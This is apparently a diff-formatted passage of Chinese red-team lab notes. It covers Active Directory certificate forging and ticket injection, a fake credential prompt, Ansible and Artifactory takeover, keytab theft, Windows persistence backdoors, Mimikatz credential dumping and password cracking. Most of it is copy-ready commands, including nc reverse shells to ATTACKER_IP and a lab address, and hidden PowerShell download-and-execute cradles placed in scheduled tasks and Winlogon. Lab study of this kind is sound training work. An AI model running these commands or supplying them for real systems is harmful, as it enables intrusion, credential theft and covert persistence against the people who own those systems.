+05/10/2022  12:12 PM    &lt;DIR&gt;          .
+05/10/2022  12:12 PM    &lt;DIR&gt;          ..
+05/10/2022  12:12 PM             1,423 local_machine_My_0_.der
+05/10/2022  12:12 PM             3,299 local_machine_My_0_.pfx
+05/10/2022  12:12 PM               939 local_machine_My_1_za-THMDC-CA.der
+05/10/2022  12:12 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
+05/10/2022  12:12 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
+05/10/2022  12:12 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
+05/10/2022  12:12 PM             1,465 local_machine_My_3_.der
+05/10/2022  12:12 PM             3,321 local_machine_My_3_.pfx 
+</code></pre>
+<p>为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为<code>mimikatz</code>有了私钥和根 CA 证书，我们可以使用 SpectorOps <a href="https://github.com/GhostPack/ForgeCert">ForgeCert</a>工具为想要的任何用户伪造一个客户端身份验证证书:</p>
+<pre><code>ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
+</code></pre>
+<p><strong>CaCertPath - 我们导出的 CA 证书的路径。</strong></p>
+<p><strong>CaCertPassword</strong> - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码为<code>mimikatz</code>.</p>
+<p><strong>Subject</strong> - 证书的主题或通用名称。这在我们将使用证书的上下文中并不重要。</p>
+<p><strong>SubjectAltName</strong> - 这是我们要使用此证书模拟的帐户的用户主体名称 (UPN)。它必须是合法用户。</p>
+<p><strong>NewCertPath</strong> - ForgeCert 将存储生成的证书的路径。</p>
+<p><strong>NewCertPassword</strong> - 由于证书需要导出用于身份验证的私钥，因此我们必须设置一个用于加密的新密码。</p>
+<p>使用 Rubeus 请求使用证书的 TGT 来验证证书是否可信:</p>
+<pre><code>Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:&lt;path to certificate&gt; /password:&lt;certificate file password&gt; /outfile:&lt;name of file to write TGT to&gt; /domain:za.tryhackme.loc /dc:&lt;IP of domain controller&gt;
+</code></pre>
+<p>一旦执行命令，应该会收到我们的 TGT:</p>
+<pre><code>Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
+          ______        _
+         (_____ \      | |
+          _____) )_   _| |__  _____ _   _  ___
+         |  __  /| | | |  _ \| ___ | | | |/___)
+         | |  \ \| |_| | |_) ) ____| |_| |___ |
+         |_|   |_|____/|____/|_____)____/(___/
+       
+         v2.0.0
+       
+       [*] Action: Ask TGT
+       
+       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
+       [*] Building AS-REQ (w/ PKINIT preauth) for: &#39;za.tryhackme.loc\Administrator&#39;
+       [+] TGT request successful!
+       [*] base64(ticket.kirbi):
+       
+             doIGADCCBfygAwIBBaEDAg..............
+       
+         ServiceName              :  krbtgt/za.tryhackme.loc
+         ServiceRealm             :  za.tryhackme.loc
+         UserName                 :  Administrator
+         UserRealm                :  za.tryhackme.loc
+         StartTime                :  2/6/2022 5:54:46 PM
+         EndTime                  :  2/7/2022 3:54:46 AM
+         RenewTill                :  2/13/2022 5:54:46 PM
+         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+         KeyType                  :  aes256_cts_hmac_sha1
+         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
+         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
+</code></pre>
+<p>有了TGT即可mimikatz注入内存进行横向移动：</p>
+<pre><code>kerberos::ptt administrator.kirbi
+</code></pre>
+<h4 id="客户端弹窗钓鱼："><a href="#客户端弹窗钓鱼：" class="headerlink" title="客户端弹窗钓鱼："></a>客户端弹窗钓鱼：</h4><pre><code class="powershell">$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName+&#39;\&#39;+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+</code></pre>
+<pre><code>$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName+&#39;\&#39;+&#39;anotherusername&#39;,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+$cred.GetNetworkCredential() | fl
+</code></pre>
+<h4 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible:"></a>Ansible:</h4><p>​	ansible能横向执行命令的本质，就是他的私钥已经写到另一台的authorized_keys里去 了，而他能作为root执行命令，是因为nopasswd sudo，所以碰到ansible能横向的机 器，找它私钥就行 只能server 控制 client.</p>
+<pre><code>//确定 Ansible 是否在我们的目标系统中使用
+1.ansible
+2.或者在/etc/passwd 下看是否有 ansibleadm用户
+</code></pre>
+<p>可以在控制器上的 &#x2F;etc&#x2F;ansible&#x2F;hosts 中找到主机清单.</p>
+<pre><code>ansible victims -a &quot;whoami&quot;
+ansible victims -a &quot;whoami&quot; -b / --become //-b默认是root
+</code></pre>
+<p>Ansible Playbooks 默认目录&#x2F;opt&#x2F;playbook 攻击方法：</p>
+<pre><code>//全局搜索yaml 或yml文件，一般主要以/opt/ansible目录下的为主
+find / -name *.yaml 2&gt;/dev/null
+find / -name *.yml 2&gt;/dev/null
+</code></pre>
+<p>密码破解：</p>
+<pre><code>pw.txt
+$ANSIBLE_VAULT;1.1;AES256
+3139386262313731643632666239363938353335303063303837666466663731386265353065346
+4
+3339626532343433316631633938383733333064626637640a64373936353663666630653537323
+1
+3264396236383039396565303362623037393538393431386639616462323639353733356339626
+4
+6530373433653562620a61376633313032616439643861663661626461373433343362653161353
+0
+3935
+</code></pre>
+<pre><code>ansible2john ./test.yml &gt;hash
+hashcat -m 16900 or john --wordlist=~/test/rockyou.txt hash //用hashcat爆破需
+要删除$之前的内容
+//在目标靶机上decrypt vault ，pw.txt就是去除了其他配置项的纯hash文件
+cat pw.txt(test.yml) | ansible-vault decrypt //输入john爆破出的密码，可以拿到用
+户密码
+</code></pre>
+<p>写入 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
+<pre><code>---
+- name: Get system info
+  hosts: all
+  gather_facts: true
+  become: yes
+  tasks:
+    - name: Display info
+      debug:
+          msg: &quot;The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}&quot;
+
+    - name: Create a directory if it does not exist
+      file:
+        path: /root/.ssh
+        state: directory
+        mode: &#39;0700&#39;
+        owner: root
+        group: root
+
+    - name: Create authorized keys if it does not exist
+      file:
+        path: /root/.ssh/authorized_keys
+        state: touch
+        mode: &#39;0600&#39;
+        owner: root
+        group: root
+
+    - name: Update keys
+      lineinfile:
+        path: /root/.ssh/authorized_keys
+        line: &quot;ssh-rsa AAAAB3NzaC1...Z86SOm...&quot;
+        insertbefore: EOF
+</code></pre>
+<pre><code>ansible-playbook xxx.yaml
+</code></pre>
+<p>RCE：</p>
+<pre><code>---
+- name: Get system info
+  hosts: all
+  gather_facts: true
+  become: yes
+  tasks:
+    - name: Display info
+      debug:
+          msg: &quot;The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}&quot;
+
+    - name: Run command
+      shell: touch /tmp/mycreatedfile.txt
+      async: 10
+      poll: 0
+</code></pre>
+<p>信息泄露 &#x2F;var&#x2F;log&#x2F;syslog，搜索关键字如: –password</p>
+<h4 id="Artifactory"><a href="#Artifactory" class="headerlink" title="Artifactory"></a>Artifactory</h4><pre><code>sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
+</code></pre>
+<p>默认页面</p>
+<pre><code>http://&lt;ip&gt;:8081/、http://&lt;ip&gt;:8082/ 用户名为“ admin”，密码为“ password123”
+</code></pre>
+<p><strong>backup file exploit</strong></p>
+<p>ArtiFactory 的开源版本以 JSON 格式为 &#x2F;&lt; ARTIFACTORY FOLDER &gt;&#x2F;var&#x2F;back&#x2F;access 的 用户帐户创建数据库备份。</p>
+<pre><code>/opt/jfrog/artifactory/var/backup/access //默认路径
+&quot;password&quot; :
+&quot;bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm&quot;
+bcrypt散列破解需要删除前面的 bcrypt$
+john --wordlist=~/test/rockyou.txt hash
+</code></pre>
+<p>破解数据库 包含用户信息的数据库位于 &#x2F;opt&#x2F;jfrog&#x2F;artifactory&#x2F;var&#x2F;data&#x2F;access&#x2F;derby</p>
+<pre><code>//我们将在/tmp 中为数据库创建一个临时文件夹。然后，我们从原始位置复制数据库，并
+从复制时正在使用的数据库中删除所有存在的锁文件。
+offsec@controller:~$ mkdir /tmp/hackeddb
+offsec@controller:~$ sudo cp -r /opt/jfrog/artifactory/var/data/access/derby
+/tmp/hackeddb
+offsec@controller:~$ sudo chmod 755 /tmp/hackeddb/derby
+offsec@controller:~$ sudo rm /tmp/hackeddb/derby/*.lck
+//运行 Derby 连接实用程序并连接到我们的数据库
+//Java 路径: /opt/jfrog/artifactory/app/third-party/java/bin/java
+offsec@controller:~$ sudo /opt/jfrog/artifactory/app/third-party/java/bin/java
+-jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
+ij version 10.15
+ij&gt; connect &#39;jdbc:derby:/tmp/hackeddb/derby&#39;;
+ij&gt;
+//查询数据库获得密码
+ij&gt; select * from access_users;
+USER_ID |USERNAME |PASSWORD |ALLOWED_IPS |CREATED |MODIFIED |FIRSTNAME
+|LASTNAME |EMAIL |REALM |STATUS |LAST_LOGIN_TIME |LAST_LOGIN_IP
+|FAILED_ATTEMPTS |STATUS_LAST_MODIFIED| PASSWORD_LAST_MODIF&amp;
+...
+1 |admin |bcrypt$$2a$08$3gNs9Gm4wqY5ic/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2
+|127.0.0.1 |1591715727140 |1591715811546 |NULL |NULL |NULL |internal |enabled
+|1596125074382 |192.168.118.5 |0 |1591715811545 |1591715811545
+...
+3 |developer
+|bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm |*
+|1591715957889 |1591715957889 |NULL |NULL |developer@corp.local |internal
+|enabled |0 |NULL |0 |1591715957889 |1591715957889
+3 rows selected
+ij&gt;
+</code></pre>
+<p>添加辅助 Artifactory 管理员帐户，</p>
+<p>需要root权限，需要重启artifactory &#x2F;opt&#x2F;jfrog&#x2F;artifactory&#x2F;var&#x2F;etc&#x2F;access sudo 创建一个名为 bootstrap.creds 的文件</p>
+<pre><code>haxmin@*=haxhaxhax //username:haxmin password:haxhaxhax
+</code></pre>
+<pre><code>offsec@controller:/opt/jfrog$ sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
+offsec@controller:/opt/jfrog$ sudo
+/opt/jfrog/artifactory/app/bin/artifactoryctl stop
+</code></pre>
+<pre><code>offsec@controller:/opt/jfrog$ sudo
+/opt/jfrog/artifactory/app/bin/artifactoryctl start
+offsec@controller:~$ sudo grep &quot;Create admin user&quot;
+/opt/jfrog/artifactory/var/log/console.log
+</code></pre>
+<p>一旦 Artifactory 再次运行，我们就可以使用新创建的帐户登录。我们现在拥有 Artifactory 的管理员访问权限，并且可以根据需要修改二进制文件。在web页面上用反弹shell替换 binary</p>
+<h4 id="Linux-kerberos"><a href="#Linux-kerberos" class="headerlink" title="Linux kerberos"></a>Linux kerberos</h4><pre><code>//login
+ssh administrator@corp1.com@192.168.217.45
+ssh corp1.com\\administrator@192.168.217.45
+env | grep KRB5CCNAME
+klist
+kinit //该命令用于为当前用户获取 Kerberos 票据授予票据(TGT)。要请求一个
+TGT，我们只需要调用 kinit 而不需要参数，并输入用户的 AD 密码。
+kdestroy //清除票据
+//在拥有域管理员权限时查询spn
+ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D &quot;Administrator@CORP1.COM&quot; -W -b &quot;dc=corp1,dc=com&quot; &quot;servicePrincipalName=*&quot; servicePrincipalName 
+//强制它使用Kerberos 身份验证。它可能会询问 LDAP 密码，提示符下单击 Enter即可
+find / -name *.keytab 2&gt;/dev/null
+</code></pre>
+<p>Stealing Keytab：票据过期的话注意 kinit -R</p>
+<pre><code>root@linuxvictim:/tmp#cat administrator.keytab | base64 -w0
+
+┌──(root💀kali)-[~/test/osep/chapter13]
+└─# echo
+BQIAAAA9AAEACUNPUlAxLkNPTQANYWRtaW5pc3RyYXRvcgAAAAFkstMtAQAXABAoktJs34TXpw4us7n
+wXEJeAAAAAQ== |base64 -d &gt;keytab
+┌──(root💀kali)-[~/test/osep/chapter13]
+└─# impacket-psexec -keytab keytab corp1.com/administrator@DC01.CORP1.COM
+</code></pre>
+<h1 id="Persistence-Control"><a href="#Persistence-Control" class="headerlink" title="Persistence Control"></a>Persistence Control</h1><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH:"></a>SSH:</h4><pre><code>ssh-keygen -t rsa
+#把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限
+cat id_dsa.pub &gt;&gt;  ~/.ssh/authorized_key
+</code></pre>
+<h4 id="屏幕保护："><a href="#屏幕保护：" class="headerlink" title="屏幕保护："></a>屏幕保护：</h4><p>创建一个注册表项设置屏幕保护的超时时间决定什么时候启动屏 幕保护程序:</p>
+<pre><code>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v &quot;SCRNSAVE.EXE&quot; /t REG_SZ /d &quot;C:\\windows\\system32\\notepad.exe&quot; /f
+reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v &quot;ScreenSaveTimeOut&quot; /t REG_SZ /d &quot;10&quot; /f
+</code></pre>
+<h4 id="启动服务："><a href="#启动服务：" class="headerlink" title="启动服务："></a>启动服务：</h4><pre><code>sc.exe create THMservice2 binPath= &quot;C:\windows\rev-svc.exe&quot; start= auto
+sc.exe start THMservice2
+</code></pre>
+<p>修改现有服务：</p>
+<pre><code>sc.exe query state=all
+sc.exe qc THMService3
+sc.exe config THMservice3 binPath= &quot;C:\Windows\rev-svc2.exe&quot; start= auto obj= &quot;LocalSystem&quot;
+sc.exe qc THMservice3
+</code></pre>
+<p>自启动服务：</p>
+<pre><code>sc create PS binpath=&quot;c:\windows\system32\notepad.exe&quot; start=auto
+sc create name start=auto binPath=&quot;后门或命令&quot; obj=Localsystem
+</code></pre>
+<p>隐藏服务：</p>
+<pre><code>sc sdset servername &quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
+</code></pre>
+<p>显示服务：</p>
+<pre><code>sc sdset servername &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
+</code></pre>
+<pre><code>sc description &quot;GoogleUpdated&quot; &quot;description&quot; #设置服务的描述字符串 
+sc config &quot;GoogleUpdated&quot; start= auto #设置这个服务为自动启动
+net start &quot;GoogleUpdated&quot; #启动服务
+sc delete &quot;GoogleUpdated&quot; #删除服务
+</code></pre>
+<h4 id="快捷方式："><a href="#快捷方式：" class="headerlink" title="快捷方式："></a>快捷方式：</h4><pre><code>#创建POWERSHELL脚本：
+Start-Process -NoNewWindow &quot;c:\tools\nc64.exe&quot; &quot;-e cmd.exe ATTACKER_IP 4445&quot;
+C:\Windows\System32\calc.exe
+#创建快捷方式包含以下命令
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+
+#利用vbs脚本同时启动两个程序
+Set ws = CreateObject(&quot;Wscript.Shell&quot;)
+ws.run &quot;C:\Users\World&#39;sEnd\Desktop\shell.exe&quot;
+ws.run &quot;D:\SoftWare\CloudMusic\cloudmusic.exe&quot;,vbhide
+#创建一个快捷方式将其链接到vbs脚本并替换响应的图标。可搭配开机自启动：
+copy &quot;link.lnk&quot; &quot;C:\Users\World&#39;sEnd\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;
+</code></pre>
+<h4 id="辅助功能劫持："><a href="#辅助功能劫持：" class="headerlink" title="辅助功能劫持："></a>辅助功能劫持：</h4><pre><code>#设置中心后门(win+U)
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f
+
+#粘滞键后门(多次连按shift)
+post/windows/manage/sticky_keys 
+#或者手敲命令：
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y
+#如果提示拒绝访问：
+cacls C:\Windows\System32\sethc.exe /T /E /G everyone:F
+
+#操作注册表：
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;
+
+#屏幕键盘(ctrl+win+O)：
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f
+
+#放大镜(win +    win  - )
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f
+</code></pre>
+<h4 id="映象功能劫持："><a href="#映象功能劫持：" class="headerlink" title="映象功能劫持："></a>映象功能劫持：</h4><pre><code>#注册表位置：
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
+#当再启动notepad时便会启动calc ：
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v Debugger /d &quot;c:\windows\system32\calc.exe&quot; /reg:32
+</code></pre>
+<h4 id="Powershell持久化："><a href="#Powershell持久化：" class="headerlink" title="Powershell持久化："></a>Powershell持久化：</h4><pre><code>#Windows PowerShell启动，如果%HOMEPATH%&quot;\documents&quot;\windowspowershell目录中有profile.ps1脚本，它便会加载：
+echo &quot;c:\windows\system32\calc.exe&quot; &gt; profile.ps1
+move profile.ps1 %HOMEPATH%&quot;\documents&quot;\windowspowershell
+
+#PowerShell无文件落地：
+powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://XX.XX.XX.XX/.exe&#39;))&quot;
+</code></pre>
+<h4 id="计划任务："><a href="#计划任务：" class="headerlink" title="计划任务："></a>计划任务：</h4><pre><code>#创建计划任务：
+schtasks /create /ru system /tn Fistlist /tr &quot;c:\windows\system32\notepad.exe&quot; /sc once /st 17:45 /f
+#删除计划任务：
+schtasks /delete /tn Fistlist /f
+#PowerShell 脚本:
+schtasks /create /tn WindowsUpdate /tr &quot;powershell.exe -nop -w hidden -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://IP/a&#39;&#39;&#39;))&#39;&quot; /sc onidle /i 1
+    
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr &quot;c:\tools\nc64 -e cmd.exe 10.10.122.147 4449&quot; /ru SYSTEM
+#查询任务是否成功
+schtasks /query /tn thm-taskbackdoor
+#将任务设置不可见
+所有计划任务的安全描述符都存储在HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. 您将找到每个任务的注册表项，在该注册表项下名为“SD”的值包含安全描述符。如果您拥有 SYSTEM 权限，则能删除该值。
+</code></pre>
+<pre><code>#现有任务
+#将任务信息导出为xml文件：
+schtasks /query /fo list /tn &quot;\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization&quot; /v /xml&gt;task.xml
+#在xml文件中添加以下内容：
+&lt;Exec&gt;
+    &lt;Command&gt;c:\windows\system32\notepad.exe&lt;/Command&gt;
+&lt;/Exec&gt;
+#也可尝试在usersid下添加以下内容提升权限：
+&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+
+#修改计划任务配置：
+schtasks /create /tn &quot;\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization&quot; /xml task.xml /f
+#校验配置是否更改成功：
+schtasks /query /tn &quot;\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization&quot; /v /fo list
+#立即执行：
+schtasks /run /tn &quot;\Microsoft\Windows\Work Folders\Work Folders Logon Synchronization&quot;
+</code></pre>
+<h4 id="Winlogon植入后门"><a href="#Winlogon植入后门" class="headerlink" title="Winlogon植入后门"></a>Winlogon植入后门</h4><pre><code>#注册表位置，可指定在用户登录时加载要执行的程序：
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+#插入前先查询一下该键值，避免一些不必要的麻烦：
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v &quot;Shell&quot; /t REG_SZ /d &quot;explorer.exe,notepad.exe&quot; /f
+
+#无文件后门效果：
+Set-ItemProperty  &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name  Userinit -value &quot;C:\Windows\system32\userinit.exe, powershell.exe -nop  -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://ip/a&#39;))\&quot;&quot;
+</code></pre>
+<h4 id="登录脚本："><a href="#登录脚本：" class="headerlink" title="登录脚本："></a>登录脚本：</h4><pre><code>HKEY_CURRENT_USER\Environment\
+</code></pre>
+<h4 id="启动项："><a href="#启动项：" class="headerlink" title="启动项："></a>启动项：</h4><pre><code>#开机启动的注册表：
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
+#基于策略的自启动注册表：
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+#设置启动文件夹注册表：
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\&quot;User Shell Folders&quot;
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\&quot;Shell Folders&quot;
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\&quot;Shell Folders&quot;
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\&quot;User Shell Folders&quot;
+#设置服务启动项注册表:
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
+#添加注册表项：
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;健名&quot; /t REG_SZ /d &quot;绝对路径&quot; /f
+#删除注册表项：
+REG DELETE &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v &quot;SCRNSAVE.EXE&quot; /f
+</code></pre>
+<pre><code>#开始菜单启动项：
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+#注册表自启动项：
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+    
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+    
+#用户环境变量
+HKCU\Environment
+我们将使用该UserInitMprLogonScript条目指向我们的有效负载，以便在用户登录时加载它：
+</code></pre>
+<h4 id="文件隐藏："><a href="#文件隐藏：" class="headerlink" title="文件隐藏："></a>文件隐藏：</h4><pre><code>attrib +s +a +h +r &lt;filename&gt;
+</code></pre>
+<h1 id="PasswordAttack"><a href="#PasswordAttack" class="headerlink" title="PasswordAttack"></a>PasswordAttack</h1><h4 id="Mimikatz："><a href="#Mimikatz：" class="headerlink" title="Mimikatz："></a>Mimikatz：</h4><pre><code class="bat">mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # sekurlsa::logonpasswords
+sekurlsa::logonpasswords
+lsadump::lsa /patch
+lsadump::secrets
+token::elevate
+sekurlsa::tickets
+lsadump::sam
+
+#use mimikatz to decrypt local dmp file
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
+mimikatz # lsadump::dcsync /domain:infinity.com /user:infinity\krbtgt
+
+mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot; &gt;&gt;
+hash.txt
+mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot;
+exit &gt;&gt; hash.txt
+</code></pre>
+<h4 id="卷影副本："><a href="#卷影副本：" class="headerlink" title="卷影副本："></a>卷影副本：</h4><pre><code class="txt">set context persistent nowriters
+add volume c: alias whomi
+create
+expose %whomi% z:
+</code></pre>
+<pre><code class="bash">unix2dos whoami.txt 
+</code></pre>
+<pre><code class="bash">diskshadow /s whoami.txt
+</code></pre>
+<pre><code class="bash">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit
+system文件位置:C:\Windows\System32\config\SYSTEM
+sam文件位置:C:\Windows\System32\config\SAM
+
+reg save HKLM\sam C:\users\world\Desktop\sam
+reg save HKLM\system C:\users\admin\Desktop\system
+</code></pre>
+<p>删除卷：</p>
+<pre><code>DELETE SHADOWS EXPOSED z:
+</code></pre>
+<h4 id="hashcat："><a href="#hashcat：" class="headerlink" title="hashcat："></a>hashcat：</h4><pre><code>hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
+-a 字典攻击
+-m md5形式
+#暴力猜解
+hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
+</code></pre>
+<h4 id="John："><a href="#John：" class="headerlink" title="John："></a>John：</h4><p>john配置文件于kalinux中位于 &#x2F;etc&#x2F;john&#x2F;john.conf ，可根据已有密码字典制定规则制作新的字典，配置文件很长，选择直接用 &gt;&gt; 输出到文件末尾:</p>
+<pre><code>#规则名称:THM-Password-Attacks
+echo &quot;[List.Rules:THM-Password-Attacks]&quot;&gt;&gt;/etc/john/john.conf
+#规则，Az&quot;[0-9]&quot; ^[\!@#$] 在每一行头添加特殊字符，在末尾添加一位数字，命令为两位。
+echo &quot;Az\&quot;[0-9][0-9]\&quot; ^[\!@#$]&quot;&gt;&gt;/etc/john/john.con
+</code></pre>
+<pre><code>cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/  
+
+#--stdout用于终端输出
+john --wordlist=./clinic.lst --rules=THM-Password-Attacks --stdou
+</code></pre>
+<p>制定新规则：</p>
+<pre><code>[symbol][dictionary word][0-9][0-9]
+</code></pre>
+<p>在单词列表首添加特殊符号，$为在列表尾添加，在单词列表末尾添加2位数字。</p>
+<pre><code>echo &quot;[List.Rules:THM-Password-Attacks2]&quot;&gt;&gt;/etc/john/john.conf
+echo &quot;Az\&quot;[0-9][0-9]\&quot; ^[\!@]&quot;&gt;&gt;/etc/john/john.conf
+</code></pre>
+<pre><code>john --wordlist=./clinic.lst --rules=THM-Password-Attacks2 --stdou &gt; newpasswd
+</code></pre>
+<pre><code>echo &quot;[\!@$#]&quot;&gt;&gt;/etc/john/john.conf
+</code></pre>
+<h4 id="MakeDicts："><a href="#MakeDicts：" class="headerlink" title="MakeDicts："></a>MakeDicts：</h4><pre><code>https://cirt.net/passwords
+https://default-password.info/
+https://datarecovery.com/rd/default-passwords/
+https://wiki.skullsecurity.org/index.php/Passwords
+
+#定制字典：
+# -m 长度超过6的单词 -w 保存到指定文件
+cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+cewl -w list.txt -d 5 -m 5 http://thm.labs
+#组合：
+cat file1.txt file2.txt file3.txt &gt; combined_list.txt
+#去重
+sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt
+
+#密码空间
+#从01234abcd生成最小长度2最大长度2的单词表
+crunch 2 2 01234abcd -o crunch.txt
